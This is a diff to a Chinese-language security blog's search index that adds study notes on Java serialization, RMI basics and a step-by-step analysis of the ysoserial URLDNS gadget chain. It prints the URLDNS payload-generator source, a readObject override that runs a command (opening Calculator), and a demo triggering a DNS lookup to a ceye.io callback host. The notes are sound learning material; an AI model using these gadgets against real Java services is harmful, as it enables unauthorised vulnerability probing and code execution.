@@ -251,6 +251,9 @@
 <h2 id="Java安全">Java安全</h2>
 <ul>
 <li><a href="/Java/javasec/1.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84">Java安全学习之反射</a></li>
+<li><a href="/Java/javasec/2.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8BRMI">Java安全学习之RMI</a></li>
+<li><a href="/Java/javasec/3.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Java安全学习之反序列化</a></li>
+<li>[ysoserial URLDNS详细分析](/Java/javasec/4.ysoserial URLDNS详细分析)</li>
 </ul>
 <h1 id="算法"><strong>算法</strong></h1>
 <h2 id="Leetcode">Leetcode</h2>
@@ -20101,6 +20104,8 @@ P神-java安全漫谈-反射机制3（知识星球-代码审计）</p>
     <title>Java基础学习之动态代理</title>
     <url>/Java/code/7.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
     <content><![CDATA[<h1 id="Java基础学习之动态代理">Java基础学习之动态代理</h1>
+<p>可以直接看这篇文章，由简到难，演进过程讲的很清楚：<a href="https://zhuanlan.zhihu.com/p/62534874">https://zhuanlan.zhihu.com/p/62534874</a></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210312165633.png" alt=""></p>
 <p>参考：</p>
 <p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p>
 <p><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open</a></p>
@@ -20235,6 +20240,186 @@ P神-java安全漫谈-反射机制3（知识星球-代码审计）</p>
       </categories>
       <tags>
         <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java安全学习之反序列化</title>
+    <url>/Java/javasec/3.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="Java安全学习之反序列化">Java安全学习之反序列化</h1>
+<p>参考：</p>
+<p>P神—代码审计—Java安全漫谈-07.反序列化篇(1)</p>
+<p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p>
+<p><a href="http://www.lmxspace.com/2019/03/11/Java-web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">http://www.lmxspace.com/2019/03/11/Java-web学习之路-序列化和反序列化</a></p>
+<p><a href="https://xz.aliyun.com/t/4711">https://xz.aliyun.com/t/4711</a></p>
+<h2 id="0x01-Java序列化和反序列化">0x01 Java序列化和反序列化</h2>
+<p>能学到Java序列化和反序列化的同学基本上肯定了解PHP的反序列化漏洞，也能写PHP反序列化的Gadget。其实这两者很相似，但又不尽相同。</p>
+<blockquote>
+<p><strong>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</strong><br>
+<strong>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</strong></p>
+</blockquote>
+<p>Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p>
+<p>java中的一个类的对象要想序列化成功，必须满足两个条件：</p>
+<ol>
+<li>该类必须实现 <strong>java.io.Serializable</strong> 接口，因为 <strong>Serializable</strong> 接口是启用其序列化功能的接口。</li>
+<li>该类的所有属性必须是可序列化的。</li>
+</ol>
+<p>实现序列化与反序列化代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">          <span class="comment">//定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">          <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">          <span class="comment">//writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">          <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面代码将 String 对象 obj1 序列化后写入文件 object 文件中，后又从该文件反序列化得到该对象。我们来看一下 object 文件中的内容：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313162924.png" alt=""></p>
+<blockquote>
+<p>这里需要注意的是，<code>ac ed 00 05</code>是 java 序列化内容的特征，</p>
+</blockquote>
+<p>再来看一段代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次我们自己写了一个 class 来进行对象的序列与反序列化。我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 <a href="http://myObj.name">myObj.name</a> 赋值为了 “hi” ，然后序列化写入文件 object：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313163550.png" alt=""></p>
+<p>然后读取 object 反序列化时：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313163209.png" alt=""></p>
+<p>我们注意到 MyObject 类实现了<code>Serializable</code>接口，并且重写了<code>readObject()</code>函数。这里的 readObject() 执行了<code>Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app/&quot;)</code>，而 readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject() 是可以重写的，可以定制反序列化的一些行为。</p>
+<h2 id="0x02-反序列化漏洞分析">0x02 反序列化漏洞分析</h2>
+<p>看完上一章节你可能会说不会有人这么写 readObject() ，当然不会，但是实际也不会太差。</p>
+<p>这里就用ysoserial工具给出的各种反序列化漏洞来分析，Step By Step：</p>
+<p>ysoserial URLDNS详细分析</p>
+<p>ysoserial CommonsCollections1详细分析</p>
+<p>ysoserial CommonsCollections2详细分析</p>
+<p>ysoserial CommonsCollections3详细分析</p>
+<p>ysoserial CommonsCollections4详细分析</p>
+<p>ysoserial CommonsCollections5详细分析</p>
+<p>ysoserial CommonsCollections6详细分析</p>
+<p>ysoserial CommonsCollections7详细分析</p>
+]]></content>
+      <categories>
+        <category>Web安全基础学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全学习</tag>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java安全学习之RMI</title>
+    <url>/Java/javasec/2.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8BRMI/</url>
+    <content><![CDATA[<h1 id="Java安全学习之RMI基础">Java安全学习之RMI基础</h1>
+<p>参考：</p>
+<p>java安全漫谈-04.RMI篇(1)</p>
+<p><a href="https://www.jianshu.com/p/2c78554a3f36">深入理解RMI原理</a></p>
+<p><a href="https://xz.aliyun.com/t/6660">先知——RMI-反序列化</a></p>
+<p><a href="https://paper.seebug.org/1251/">Seebug——Java 安全-RMI-学习总结</a></p>
+<p><a href="https://xz.aliyun.com/t/4711">浅显易懂的JAVA反序列化入门</a></p>
+<p><a href="https://blog.csdn.net/he_and/article/details/105532007">【入坑JAVA安全】RMI基础看这一篇就足够了</a></p>
+<p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></p>
+<p>前置知识：</p>
+<p>RPC、反射、动态代理</p>
+<h2 id="0x01-RMI是什么">0x01 RMI是什么</h2>
+<p>RMI（Remote Method Invocation），是一种跨JVM实现方法调用的技术。</p>
+<p>在RMI的通信方式中，由以下三个大部分组成：</p>
+<ul>
+<li>Client：客户端调用服务端的方法</li>
+<li>Registry：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li>
+<li>Server：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li>
+</ul>
+<p>其中Client是客户端，Server是服务端，而Registry是注册中心。</p>
+<p>客户端会Registry取得服务端注册的服务，从而调用服务端的远程方法。</p>
+<p>注册中心在RMI通信中起到了一个什么样的作用？我们可以把他理解成一个字典，一个负责网络传输的模块。</p>
+<p>服务端在注册中心注册服务时，需要提供一个key以及一个value，这个value是一个远程对象，Registry会对这个远程对象进行封装，使其转为一个远程代理对象。当客户端想要调用远程对象的方法时，则需要先通过Registry获取到这个远程代理对象，使用远程代理对象与服务端开放的端口进行通信，从而取得调用方法的结果。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210312141656.png" alt=""></p>
+<h2 id="0x02-RMI基础使用">0x02 RMI基础使用</h2>
+<p>Server部署：</p>
+<ol>
+<li>Server向Registry注册远程对象，远程对象绑定在一个<code>//hostL:port/objectname</code>上，形成一个映射表（Service-Stub）。</li>
+</ol>
+<p>Client调用：</p>
+<ol>
+<li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li>
+<li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li>
+<li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li>
+</ol>
+<p>先定义一个远程接口：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">rmidemo</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在定义远程接口的时候需要继承<code>java.rmi.Remote</code>接口，并且修饰符需要为<code>public</code>否则远程调用的时候会报错。并且定义的方法里面需要抛出一个<code>RemoteException</code>的异常。</p>
+<p>再编写一个远程接口的实现类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">rmidemo</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在编写该实现类中需要将该类继承<code>UnicastRemoteObject</code>。</p>
+<p>接着创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">servet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        rmidemo hello = <span class="keyword">new</span> RemoteHelloWorld();<span class="comment">//创建远程对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;hello&quot;</span>,hello);<span class="comment">//将远程对象注册到注册表里面，并且设置值为hello</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>到了这一步，简单的RMI服务端的代码就写好了。下面来写一个客户端调用该远程对象的代码。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmi.RemoteHelloWorld;</span><br><span class="line"><span class="keyword">import</span> com.rmi.rmidemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">clientdemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="comment">// 利用注册表的代理去查询远程注册表中名为hello的对象</span></span><br><span class="line">        rmidemo hello = (rmidemo) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        System.out.println(hello.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这一步需要注意的是，如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。</p>
+<p>参考文章中有关于对RMI过程源码分析或者流量分析的文章，我这里就摘取总结性的段落。</p>
+<blockquote>
+<p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是hello()。</p>
+</blockquote>
+<h2 id="0x03-RMI攻击方式">0x03 RMI攻击方式</h2>
+<blockquote>
+<p>待填坑，等学完反序列化再来。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web安全基础学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全学习</tag>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ysoserial URLDNS详细分析.md</title>
+    <url>/Java/javasec/4.ysoserial%20URLDNS%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="Java安全学习之ysoserial-URLDNS详细分析">Java安全学习之ysoserial URLDNS详细分析</h1>
+<p>参考：</p>
+<p>P神—代码审计—Java安全漫谈-08.反序列化篇(2)</p>
+<p>java测试环境:</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313164533.png" alt=""></p>
+<p>打开ysoserial项目，找到<code>ysoserial/src/main/ysoserial/payloads/URLDNS.java</code>文件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这就是用来生成payload的Gadget。代码暂时看不明白问题不大，可以先看注释来找反序列化的入口点<code>readObject</code>函数。</p>
+<p>那么，我们可以直奔 HashMap 类的 readObject ⽅法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165103.png" alt=""></p>
+<p>因为从注释中可知道，是hashCode的计算操作触发了DNS请求，所以直接看到1413行，这里使用hash方法处理key，跟进hash方法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165253.png" alt=""></p>
+<p>这里调用了<code>key</code>的<code>hashCode</code>方法，调用<code>key</code>的<code>hashCode</code>方法就是调用URL类型的hashCode的方法。</p>
+<p>为什么这么说？回到URLDNS类文件：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170320.png" alt=""></p>
+<p>很明显是要把URL对象当做Key，那么就查看<code>URL.java</code>文件中的<code>hashCode</code>方法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170503.png" alt=""></p>
+<p><code>hashCode</code>是一个私有变量，默认值为-1，所以接着调用了hanlder类的<code>hashCode</code>方法,查看<code>URLStreamHandler</code>类的<code>hanlder</code>：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170757.png" alt=""></p>
+<p>继续跟<code>getHostByName</code>方法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313170956.png" alt=""></p>
+<p>终点就在<code>getByName</code>API函数，把Host解析成IP地址：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313171010.png" alt=""></p>
+<p>从而会触发一次DNS请求。</p>
+<p>回到HashMap.java的<code>readObject</code>方法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313232828.png" alt=""></p>
+<p>看到第1410行，<code>key</code>和<code>value</code>两个参数都是通过<code>readObject</code>获取的，那么肯定在序列化时向其中写了内容，因为没有序列化，哪来反序列化之说。在<code>HashMap.java</code>文件中搜索<code>writeObject</code>函数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165649.png" alt=""></p>
+<p>跟进<code>internalWriteEntries</code>函数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313165910.png" alt=""></p>
+<p>我们发现这里的key和value是从tab[i]中取出来的,而tab的值就是HashMap的table的值，而tab的值就是HashMap的table的值。如果我们想修改table的值的话,就是修改hashMap的put方法，查看put方法：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233216.png" alt=""></p>
+<p>如果我们调用了HashMap的put方法，就会去调用一次hash函数。</p>
+<p>再回来看ysoserial给的Gadget：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233605.png" alt=""></p>
+<p>把URL对象作为key传给了hash函数，那么也就是调用URL.java的hash方法，最后到了<code>getByName</code>API函数。</p>
+<p>其实我们也可以自己写一个demo：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlDnsDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://ufzv12.ceye.io&quot;</span>);</span><br><span class="line">        map.put(url, <span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210313233900.png" alt=""></p>
+<p>所以，⾄此，整个URLDNS的Gadget其实清晰⼜简单：</p>
+<p>1.HashMap-&gt;readObject()</p>
+<p>2.HashMap-&gt;hash()</p>
+<p>3.URL-&gt;hashCode()</p>
+<p>4.URLStreamHandler-&gt;hashCode()</p>
+<p>5.URLStreamHandler-&gt;getHostAddress()</p>
+<p>6.InetAddress-&gt;getByName()</p>
+<p>从反序列化最开始的readObject，到最后触发DNS请求的getByName，只经过了6个函数调⽤。</p>
+]]></content>
+      <categories>
+        <category>Web安全基础学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全学习</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
 </search>
